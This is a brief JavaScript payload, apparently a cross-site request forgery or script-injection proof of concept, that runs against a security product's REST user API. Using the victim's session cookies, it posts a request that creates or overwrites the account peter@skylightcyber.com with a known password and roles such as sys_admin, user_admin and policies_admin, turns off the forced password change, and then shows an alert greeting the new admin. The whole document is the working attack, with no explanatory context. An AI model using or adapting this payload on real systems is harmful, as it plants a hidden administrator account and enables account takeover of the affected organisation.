function submitRequest()
{
  var xhr = new XMLHttpRequest();
  xhr.open("POST", "\/rest\/users\/peter@skylightcyber.com", true);
  xhr.setRequestHeader("Accept", "application\/json, text\/plain, *\/*");
  xhr.setRequestHeader("Content-Type", "application\/json;charset=UTF-8");
  xhr.setRequestHeader("Accept-Language", "en-US,en;q=0.9");
  xhr.withCredentials = true;
  var body = "{\"username\":\"peter@skylightcyber.com\",\"password\":\"Password1!\",\"roles\":[\"analyst_l3\",\"executive\",\"sys_admin\",\"user_admin\",\"responder\",\"policies_admin\"],\"changePasswordOnNextLogin\":false,\"isDailyNotifications\":false,\"allowedLoginMethod\":\"PASSWORD\",\"groups\":[]}";
  var aBody = new Uint8Array(body.length);
  for (var i = 0; i < aBody.length; i++)
    aBody[i] = body.charCodeAt(i); 
  xhr.send(new Blob([aBody]));
}
submitRequest();
alert('hello new admin!');
